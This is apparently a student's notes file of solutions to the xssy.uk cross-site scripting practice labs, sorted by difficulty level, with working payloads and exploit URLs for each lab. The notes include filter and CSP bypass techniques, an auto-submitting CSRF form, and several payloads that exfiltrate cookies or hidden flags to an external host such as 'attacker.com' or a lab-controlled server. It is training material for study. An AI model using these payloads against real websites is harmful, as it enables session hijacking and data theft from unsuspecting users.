@@ -1,0 +1,521 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2639
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Bold;\f1\froman\fcharset0 Times-Roman;\f2\fnil\fcharset134 STSongti-SC-Regular;
+\f3\fmodern\fcharset0 Courier;\f4\froman\fcharset0 Times-Italic;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue233;\red81\green157\blue235;\red136\green185\blue102;
+\red155\green162\blue177;\red184\green93\blue213;\red197\green136\blue83;\red74\green80\blue93;\red0\green0\blue0;
+\red255\green255\blue255;\red161\green208\blue231;\red238\green151\blue174;\red208\green208\blue220;\red183\green226\blue144;
+\red255\green255\blue255;\red174\green172\blue195;\red161\green208\blue231;\red240\green219\blue156;\red208\green208\blue220;
+\red183\green226\blue144;\red155\green235\blue208;\red238\green151\blue174;\red235\green172\blue145;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c93333;\cssrgb\c38039\c68627\c93725;\cssrgb\c59608\c76471\c47451;
+\cssrgb\c67059\c69804\c74902;\cssrgb\c77647\c47059\c86667;\cssrgb\c81961\c60392\c40000;\cssrgb\c36078\c38824\c43922;\cssrgb\c0\c0\c0;
+\cssrgb\c100000\c100000\c100000;\cssrgb\c68627\c85098\c92549;\cssrgb\c95294\c66667\c73725;\cssrgb\c85098\c85098\c89020;\cssrgb\c76471\c89804\c63137;
+\cssrgb\c100000\c100000\c100000;\cssrgb\c73725\c73333\c80784;\cssrgb\c68627\c85098\c92549;\cssrgb\c95294\c88235\c67451;\cssrgb\c85098\c85098\c89020;
+\cssrgb\c76471\c89804\c63137;\cssrgb\c66275\c92941\c85098;\cssrgb\c95294\c66667\c73725;\cssrgb\c94118\c73333\c63529;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww9340\viewh8400\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\b\fs28 \cf0 \ul \ulc0 XSS LAB By Diffculty
+\f1\b0\fs24 \ulnone \
+https://xssy.uk/allLabs\
+\
+
+\f0\b\fs28 \ul Novice Level
+\f1\b0\fs24 \ulnone \
+https://xssy.uk/lab/1: Reflected xss\
+https://4ua2fzgq.xssy.uk/target.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\
+\
+https://xssy.uk/lab/3: DOM xss\
+https://7axgjmar.xssy.uk/target.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\
+\
+https://xssy.uk/lab/176: Stored XSS\
+https://xn3lrjf6.xssy.uk/target.ftl?name=%3C%2Fp%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E\
+\
+https://xssy.uk/lab/164: Clientside validation bypass\
+<> blocked if in first character\
+https://fygkuqjd.xssy.uk/target.ftl?name=fck%3Csvg%20onload=alert(document.cookie)%3E\
+\
+https://xssy.uk/lab/10: Script/javascript context xss\
+https://66ohqg4u.xssy.uk/target.ftl?name=%22;alert(document.cookie);//\
+\
+https://xssy.uk/lab/2: Attribute xss\
+https://xonpfky4.xssy.uk/target.ftl?name=x%22%20autofocus%20onfocus=%22alert(document.cookie)\
+\
+https://xssy.uk/lab/12: href xss\
+https://alo5543d.xssy.uk/target.ftl?url=javascript%3Aalert%28document.cookie%29\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+https://xssy.uk/lab/8: Parameter name xss\
+https://sh4oxynx.xssy.uk/target.ftl?name=%3Ci%3Ebisanih&%3Ci%3Eyakin:%20%3Cscript%3Ealert(document.cookie)%3C/script%3E\
+\
+https://xssy.uk/lab/33: POST reflective xss | XSS + CSRF\
+Host this code to my_Labs\
+<html>\
+<head><title>POST based xss</title></head>\
+<body onload="document.forms[0].submit()">\
+<form action="https://bsu2zcop.xssy.uk/target.ftl" method="POST">Enter your name:\
+<input type="text" name="name" value="<script>alert(document.cookie)</script>"/>\
+<input type="submit"/>\
+</form>\
+</body>\
+</html>\
+when preview, copy the url link to submit payload\
+\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 https://xssy.uk/lab/4: \expnd0\expndtw0\kerning0
+Alert Blocked XSS\
+bypass via unicode escape\
+https://5s3ucfal.xssy.uk/target.ftl?name=%3Cscript%3Ea\\u006cert(document.cookie)%3C/script%3E\
+another technic:\
+<script>window["al"+"ert"](document.cookie)</script>\
+\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 https://xssy.uk/lab/199: Capture cookie\
+use (new Image()).src=\'91attacker.com?cookie=\'92+document.cookie\
+https://ozv4gjit.xssy.uk/target.ftl?name=%3Cscript%3E%28new+Image%28%29%29.src%3D%22https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fcookie%22%2Bdocument.cookie%3C%2Fscript%3E\
+\
+https://xssy.uk/lab/219: Cookie are closer\
+https://j3y7iahh.xssy.uk/target.ftl?name=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C/script%3E\
+\
+https://xssy.uk/lab/246: Beating encodeURI\
+%0A';alert(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101));//\
+if decode= /n alert(document.cookie);//\
+\
+https://xssy.uk/lab/625: File upload xss\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> <script type="text/javascript"> alert(document.cookie); </script> </svg>\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+\
+https://xssy.uk/lab/764: understanding DOM\
+https://ccgq7jee.xssy.uk/target.ftl?search=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\
+\
+https://xssy.uk/lab/765: No brackets\
+Bypass filter () via ASCII Decimal\
+https://c5ryxpyq.xssy.uk/target.ftl?search=%3Cimg+src%3Dx+onerror%3Dalert%26%230000000040%3Bdocument.cookie%26%230000000041%3B%3E\
+\
+https://xssy.uk/lab/767: Interpolatioin\
+https://n2kk6q7k.xssy.uk/target.ftl?search=dimana%22%20onerror=%22alert(document.cookie)\
+\
+https://xssy.uk/lab/769: Click [DOM xss]\
+https://se64r6zd.xssy.uk/target.ftl?search=javascript%3Aalert(document.cookie)#tracker\
+\
+\
+
+\f0\b\fs28 \ul Apprentice Level
+\f1\b0\fs24 \ulnone \
+\
+https://xssy.uk/lab/7: Double decode xss\
+https://vbrnqq5l.xssy.uk/target.ftl?name=%253Csvg%2520onload%253Dalert%28document.cookie%29%253E\
+\
+https://xssy.uk/lab/19: Brackets filtered xss\
+https://bdls3zqi.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3Dalert%26%230000000040%3Bdocument.cookie%26%230000000041%3B%3E\
+\
+https://xssy.uk/lab/162: Brackets & backtics filtered\
+https://rtck36fl.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3Dalert%26%230000000040%3Bdocument.cookie%26%230000000041%3B%3E\
+\
+https://xssy.uk/lab/175: Script context xss 2\
+https://q2je5dje.xssy.uk/target.ftl?name=%22;%3C/script%3E%3Cscript%3Ealert(document.cookie);//\
+\
+https://xssy.uk/lab/178: stored xss in user agent\
+Using burpsuite to intercept request & then add this payload in user-agent header:\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+<body onload=alert(document.cookie)>\
+https://xgo4vsgo.xssy.uk/target.ftl?name=%3Cbody+onload%3Dalert%28document.cookie%29%3E\
+\
+https://xssy.uk/lab/674: file name xss\
+refference: https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-h8hr-jhcx-fcv9\
+intercecpt request using burpsuite, & change body request:\
+\pard\pardeftab720\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 filename=\'94<img src=x onerror=alert(document.domain)>.svg.png\'94\
+Content-Type: application/vnd.ms-excel\
+<script>alert(document.cookie)</script>\
+The poup alert triggered in response:\
+Last file uploaded: <a href="/upload/<img src=x onerror=alert(document.cookie)>.svg.jpg"><img src=x onerror=alert(document.cookie)>.svg.jpg</a></p>\
+submitted url: https://y4vtqelm.xssy.uk/\
+\
+https://xssy.uk/lab/55: Safe HTML filter [onerror filtered]\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 create iframe to bypass filter without event-handler\
+https://js2i6iof.xssy.uk/target.ftl?name=<iframe srcdoc="<script>alert(document.cookie)</script>">\
+\
+https://xssy.uk/lab/170: large App - basic xss\
+https://jbob7737.xssy.uk/target_37.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\
+\
+https://xssy.uk/lab/197: large App - non-sequential\
+https://g3xd5j3v.xssy.uk/target_54481.ftl?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\
+\
+https://xssy.uk/lab/9: mystery parameter xss\
+Fuzzing with: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt & got hidden parameter \'91email\'92\
+https://lxxhujqz.xssy.uk/target.ftl?email=<svg onload=alert(document.cookie)>\
+\
+\
+https://xssy.uk/lab/18: \expnd0\expndtw0\kerning0
+CSP - Static Nonce Bypass \'a0\
+Because nonce is static, I inject the nonce to script => <script nonce=\'93valueofStaticnonce\'94>alert(document.cookie)</script>\
+https://j4phjo6l.xssy.uk/target.ftl?name=%3Cscript%20nonce=%22rAnd0m%22%3Ealert(document.cookie)%3C%2Fscript%3E\
+\kerning1\expnd0\expndtw0 \
+https://xssy.uk/lab/206: xss lead to \expnd0\expndtw0\kerning0
+Unauthorized\kerning1\expnd0\expndtw0  action\
+instead of trigger alert, we can escalate impact xss using code inside javascript\
+when victims click, our payload will get document.forms[0] & automatically submit()\
+because we need time to browser load content, we set timeout to wait all content is loaded\
+Final payload:\
+<script>window.setTimeout(() => \{document.forms[0].submit()\}, 500)</script>\
+URL links:\
+https://qn4u4nsp.xssy.uk/target.ftl?name=%3Cscript%3Ewindow.setTimeout%28%28%29+%3D%3E+%7Bdocument.forms%5B0%5D.submit%28%29%7D%2C+500%29%3C%2Fscript%3E\
+\
+\
+https://xssy.uk/lab/671: XSS steal data via Dangling markup\
+when inject <i>dimana the payload appear in HTML: \expnd0\expndtw0\kerning0
+<p>Hello <i>dimana but after this sentence, had hidden input that contain flag. This is complete code in view page source:\
+\pard\pardeftab720\partightenfactor0
+\cf0 <p>Hello <i>dimana<input type=hidden name=flag value=tuuljg43><input type="hidden"></p>\
+So I use dangling markup to steal this flag to our server\'85. Our findal payload like this:\
+<img src="https://eqh42jmm.xssy.uk/?\
+After that the flag was find in the log server: \
+%3Cinput%20type=hidden%20name=flag%20value=4b3p56nm%3E%3Cinput%20type=\
+\pard\pardeftab720\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 Which means we success to use dangling markup xss to steal data to server, the final url like this:\
+https://gigh5vp3.xssy.uk/target.ftl?name=%3Cimg%20src=%22https://eqh42jmm.xssy.uk/?\expnd0\expndtw0\kerning0
+\
+\
+I try use my server to capture log, but blocked by csp\
+content-security-policy default-src 'self'; img-src {\field{\*\fldinst{HYPERLINK "https://*.xssy.uk/"}}{\fldrslt \cf2 \ul \ulc2 https://*.xssy.uk/}} {\field{\*\fldinst{HYPERLINK "https://xssy.uk/"}}{\fldrslt \cf2 \ul \ulc2 https://xssy.uk/}}; style-src 'unsafe-inline'\
+<img src="https://parking-spin-feeding-perfume.trycloudflare.com/?  => fail\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+https://xssy.uk/lab/678: dangling markup part II\
+The step is similiar like part I\
+https://a7piuqnq.xssy.uk/target.ftl?name=%3Cimg+src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3F\
+flag: tmapchft\
+\
+https://xssy.uk/lab/699: unlinked\
+not solved yet\
+\
+https://xssy.uk/lab/768: open redirect\
+can redirect, but fail to get cookie\
+https://5zrbyrdi.xssy.uk/target.ftl?return=https://eqh42jmm.xssy.uk/index.html\
+\
+https://xssy.uk/lab/770: Length limits 5 characters [We did it: bypass]\
+we can only inject 5 characters in search parameter\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+document.getElementById('tracker').innerHTML = search.substring(0,5);\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 but when inspect the code, I found this:\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+var secretSearch = decodeURI(urlParams.get('secret'));\
+Ok, we get second parameters name \'91secret\'92\kerning1\expnd0\expndtw0  \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 And then first parameter & second parameter are joined in one tag\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+document.getElementById('tracker').firstChild.innerHTML = clean;\
+My final payload is:\
+search=<svg>&secret=<animate onbegin=alert(document.cookie)>\
+Full url:\
+https://zy4spebe.xssy.uk/target.ftl?search=%3Csvg%3E&secret=%3Canimate%20onbegin=alert(document.cookie)%3E\
+\pard\pardeftab720\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 https://xssy.uk/lab/856 Parameter Name 2\
+Need fuzzing to find hidden parameter, I was try fuzzing but found nothing, I skipped because didn\'92t wanna waste time\
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt\
+\
+https://xssy.uk/lab/1072: The unfinished script [I have no clue]\
+https://dl5kmrls.xssy.uk/target.ftl?name=what%3Csvg\\u003E%3Cscript\\u003E\
+\
+\
+
+\f0\b\fs28 \ul Adept Level
+\f1\b0\fs24 \ulnone \
+https://xssy.uk/lab/5: Unicode XSS. [Using Full-width character]\
+https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)#Block\
+browser will normalize fullwidth character to normal character & we using it to bypass filter / sanitation\
+Payload: 
+\f2 \'a3\'bc
+\f1 img src=x onerror=alert(document.cookie)
+\f2 \'a3\'be
+\f1 \
+Full url: https://4t64ubva.xssy.uk/target.ftl?name=%EF%BC%9Cimg%20src=x%20onerror=alert(document.cookie)%EF%BC%9E\
+\
+https://xssy.uk/lab/167: Base tag xss\
+I host app.js in server as relative path from base, inside app.js code => alert(document.cookie)\
+I inject myserver.com/app.js to the base parameter\
+when browser load source from our server it will trigger xss\
+https://xboa2upw.xssy.uk/target.ftl?base=https://eqh42jmm.xssy.uk/app.js&name=dimana\
+\
+https://xssy.uk/lab/627: \expnd0\expndtw0\kerning0
+Upload Restriction Bypass \'a0\
+I have no clue, I was try change filename, modified filetype, content-type but didn\'92t nothing\
+\
+https://xssy.uk/lab/637: \'a0Sniffing Danger \'a0[same with above]\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+I have no clue, I was try change filename, modified filetype, content-type but didn\'92t nothing\kerning1\expnd0\expndtw0 \
+\
+https://xssy.uk/lab/57: Metadata xss\
+modif image metadata using exift tool\
+in section model, inject xss script: <script>alert(document.cookie)</script>\
+and then upload this malicious image xss to lab\
+when out image uploaded, the lab will pull model name to UI & our xss payload in model metadata triggered\
+\
+https://xssy.uk/lab/60: HTML Filter event handler [Bypass via mixed case character]\
+https://vtjubozm.xssy.uk/target.ftl?name=%3CScRipt%3Ealert%28document.cookie%29%3C%2FScRIpT%3E\
+\
+https://xssy.uk/lab/168: HTML Filter - Weak Regex\
+Lab required zero click xss, but I can only achieve one-click xss\
+</p><a href=javascript:alert(document.cookie)>click\
+Ok, I finally found the technics, I use trojan horse technic, my final payloads like this:\
+<sc<script>ript>alert(document.cookie)<%2Fscript>\
+Full url:  https://fdlv7w2i.xssy.uk/target.ftl?name=%3Csc%3Cscript%3Eript%3Ealert%28document.cookie%29%3C%2Fscript%3E\
+\
+\
+https://xssy.uk/lab/58: PostMessage xss [I learn Something New: Bypass popup blocker in browser by Iframe]\
+Because this lab require zero-click xss, I learn new technic in here where <body onload=exploit()> blocked by browser security we use iframe, the code will like this:\
+<body onload="exploit()">   \
+    <script>\
+        function exploit() \{\
+            var open = window.open("https://rfm45gxl.xssy.uk/", "exploit"); // we add \'93exploit\'94 in here, when exploit function called by onload instead of open new tab, the https://rfm45gxl.xssy.uk will opened in iframe\
+            window.setTimeout( () => \{\
+                open.postMessage("<img src=x onerror=alert(document.cookie)>", '*')\
+            \}, 1000)\
+        \}\
+    </script>\
+    <button onclick="exploit()">exploit</button>\
+    <iframe name="exploit" />.  // we add <iframe name=\'93exploit\'94> this iframe will loaded when exploit() function called in onload\
+</body>\
+Lab solved by hosted this code to attacker server, when victim the link, post-message xss will triggered\
+\
+\
+https://xssy.uk/lab/679: CSP bypass: Nonce predictable bypass\
+When review the CSP directive, nonce value seems like based on time:\
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src https://xssy.uk/; style-src 'unsafe-inline'; script-src 'nonce-2025-10-25T0905Z'">\
+So I use this script to find the nonce value of time:\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+new Date().toISOString().slice(0,16).replace(':','') + \'91Z\'92   => "2025-10-25T0905Z"\
+My full payload like this: <script nonce="2025-10-25T0905Z">alert(document.cookie)</script>\
+And successfully bypass nonce protection\
+Full Url: https://yv6x4r7r.xssy.uk/target.ftl?name=%3Cscript+nonce%3D%222025-10-25T0905Z%22%3Ealert%28document.cookie%29%3C%2Fscript%3E\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+https://xssy.uk/lab/182: CSP - injection bypass\
+I hosted code alert(document.cookie) to https://eqh42jmm.xssy.uk/alert.js\
+lang= https://eqh42jmm.xssy.uk/alert\
+name=<script src="https://xx.xssy.uk/alert.js"></script>\
+Karena lang=https://eqh42jmm.xssy.uk/alert.js sudah ada js-nya secara otomatis, maka saya hanya masukkan https://eqh42jmm.xssy.uk/alert u/ modifikasi csp agar whitelist url https://eqh42jmm.xssy.uk/alert ini\
+kemudian di parameter name, baru saya inject payload xss via payload ini <script src="https://xx.xssy.uk/alert.js"></script> yang sudah saya host & di whitelist untuk bypass csp\
+Full url:\
+https://2l5dad5g.xssy.uk/target.ftl?lang= https://eqh42jmm.xssy.uk/alert&name=<script src="https://eqh42jmm.xssy.uk/alert.js"></script>\
+\
+https://xssy.uk/lab/181\
+The protection: only can load script-src from \'91data\'92\
+Payload: <script src="data:text/javascript,alert(document.cookie)"></script>  => need to URL encode\
+Full Url: https://6cpdhsai.xssy.uk/target.ftl?name=%3Cscript%20src%3D%22data%3Atext%2Fjavascript%2Calert%2528document.cookie%2529%22%3E%3C%2Fscript%3E\
+\
+https://xssy.uk/lab/173: JSONP Bypass\
+When inspect element, I found script contain jsonp endpoint. So I use this endpoint to bypass csp\
+Script contain jsonp => <script src="jsonp.ftl?callback=print"></script>\
+My payload => <script src="jsonp.ftl?callback=alert(document.cookie)"></script>\
+Full Url: https://thnxclxd.xssy.uk/target.ftl?name=%3Cscript%20src=%22jsonp.ftl?callback=alert(document.cookie)%22%3E%3C/script%3E\
+\
+https://xssy.uk/lab/628: Upload CSP bypass\
+I Can\'92t solved it\
+\
+https://xssy.uk/lab/179: Enctype spoofing\
+I can\'92t solved it\
+\
+https://xssy.uk/lab/640: CSP Exfiltration [I learn something about CSP Bypass: Via navigation technic]\
+I use location.assign to exfiltrate cookie & bypass csp default-src: none thats means connect-src is \'91none\'92 also\
+My payload: \
+- <script>location.assign("//eqh42jmm.xssy.uk?cookie="+document.cookie)</script>\
+- \cf3 \expnd0\expndtw0\kerning0
+<\cf0 script\cf3 >\cf0  window.\cf3 location=\cf4 'https://eqh42jmm.xssy.uk/?c='\cf3 +document\cf5 .\cf0 cookie\cf5 ;\cf0  \cf3 </\cf0 script\cf3 >\cf0 \kerning1\expnd0\expndtw0 \
+I use this payload to exfiltrate cookie:\
+- <script>\
+var meta = document.createElement('meta');\
+meta.httpEquiv = 'refresh';\
+meta.content = '0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;\
+document.head.appendChild(meta);\
+</script>\
+Full url perlu encode url sebelum submit: \
+https://pzcihwu2.xssy.uk/target.ftl?name=<script>var meta = document.createElement('meta');meta.httpEquiv = 'refresh';meta.content = '0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta);</script>\
+Flag: zsunagkx\
+\
+\
+https://xssy.uk/lab/736: Referer check\
+switch parameter name from body to url request\
+https://m3ult5ii.xssy.uk/target.ftl?name=%3Cimg+src%3Dx+onerror%3D%22alert%28document.cookie%29%22%3E\
+\
+https://xssy.uk/lab/882: Template\
+First I test <i>dimana the character < was filter, & based on title I uset template to trigger xss\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf0 \expnd0\expndtw0\kerning0
+FreeMarker template
+\f1\b0  menggunakan syntax 
+\f3\fs26 $\{...\}
+\f1\fs24  untuk expresi\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 My code: $\{alert(document.cookie)\}\
+https://uxookccd.xssy.uk/target.ftl?name=$\{alert(document.cookie)\}\
+\
+https://xssy.uk/lab/1068: Shallow obscurity [Code in script was obfuscated]\
+I use chatgpt to deobfuscated code:\
+\pard\pardeftab720\partightenfactor0
+\cf3 \expnd0\expndtw0\kerning0
+window\cf5 .\cf3 addEventListener\cf5 (\cf4 'hashchange'\cf5 ,\cf0  \cf6 function\cf5 ()\cf0  \cf5 \{\cf0  \
+\cf6 var\cf0  input \cf3 =\cf0  \cf3 window\cf5 .\cf0 location\cf5 .\cf0 hash\cf5 .\cf3 slice\cf5 (\cf7 1\cf5 );\cf0  
+\f4\i \cf8 // Ambil setelah #
+\f1\i0 \cf0  \
+\cf6 var\cf0  decoded \cf3 =\cf0  \cf3 decodeURIComponent\cf5 (\cf0 input\cf5 );\cf0  
+\f4\i \cf8 // Filter XSS sederhana
+\f1\i0 \cf0  \
+decoded \cf3 =\cf0  decoded\cf5 .\cf3 replace\cf5 (\cf4 /[()]/g\cf5 ,\cf0  \cf4 ''\cf5 );\cf0  
+\f4\i \cf8 // Hapus tanda kurung
+\f1\i0 \cf0  \
+decoded \cf3 =\cf0  decoded\cf5 .\cf3 replace\cf5 (\cf4 /onerror/gi\cf5 ,\cf0  \cf4 ''\cf5 );\cf0  
+\f4\i \cf8 // Hapus "onerror"
+\f1\i0 \cf0  
+\f4\i \cf8 // VULNERABLE! Output langsung ke innerHTML
+\f1\i0 \cf0  \cf3 document\cf5 .\cf3 getElementById\cf5 (\cf4 'output'\cf5 ).\cf0 innerHTML \cf3 =\cf0  \cf4 'huh!: '\cf0  \cf3 +\cf0  decoded\cf5 ;\cf0  \cf5 \});\cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 My payload: #<iframe src=javascript:alert&lpar;document.cookie&rpar;>\
+full url: https://fku2gvhv.xssy.uk/#%3Ciframe%20src=javascript:alert&lpar;document.cookie&rpar;%3E\
+\
+\
+
+\f0\b\fs28 \ul Adept Level\
+
+\f1\b0\fs24 \ulnone https://xssy.uk/lab/626: \expnd0\expndtw0\kerning0
+HTML Upload Blocked \'a0\
+Not yet\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 https://xssy.uk/lab/638: Polyglot XSS \'a0\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+Not yet\kerning1\expnd0\expndtw0 \
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+https://xssy.uk/lab/677: Null Byte Injection \'a0\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 Not yet\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 https://xssy.uk/lab/11: Overlong UTF-8 XSS \'a0\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 https://7fj3bijv.xssy.uk/target.ftl?name=%C0%BCscript%C0%BEalert(document.cookie)%C0%BC/script%C0%BE\
+\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 https://xssy.uk/lab/191: Split Payload\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 Not yet\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+https://xssy.uk/lab/201: HttpOnly Bypass \'a0\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 Not yet\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 https://xssy.uk/lab/207: UPPERCASE\
+Refference: https://hackerone.com/reports/1167034\
+Step 1: bypass onload filter => oOnLoAnLoAd\
+Step 2: encode []["filter"]["constructor"]("alert(document.cookie)")() with ASCII Octal => [][%22\\146\\151\\154\\164\\145\\162%22][%22\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162%22](%22\\141\\154\\145\\162\\164\\50\\144\\157\\143\\165\\155\\145\\156\\164\\056\\144\\157\\155\\141\\151\\156\\51%22)()\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 Full URL: https://ez27zilh.xssy.uk/target.ftl?name=%3C/p%3E%3CBoDy%20oOnLoAnLoAd=[]["\\146\\151\\154\\164\\145\\162"]["\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162"]("\\141\\154\\145\\162\\164\\50\\144\\157\\143\\165\\155\\145\\156\\164\\056\\143\\157\\157\\153\\151\\145\\51")()%3E\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 https://xssy.uk/lab/214\kerning1\expnd0\expndtw0 : \expnd0\expndtw0\kerning0
+Href XSS 2 \'a0\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 https://sh5efuuc.xssy.uk/target.ftl?url=https%3A%2F%2Feqh42jmm.xssy.uk%2F\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+https://xssy.uk/lab/215: WebSocket XSS\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 Not yet\kerning1\expnd0\expndtw0 \
+\
+https://xssy.uk/lab/220: \expnd0\expndtw0\kerning0
+Unscripted \'a0\kerning1\expnd0\expndtw0 \
+\expnd0\expndtw0\kerning0
+Not yet\kerning1\expnd0\expndtw0 \
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+https://xssy.uk/lab/738: Referer & Origin Check \'a0\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+Not yet\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
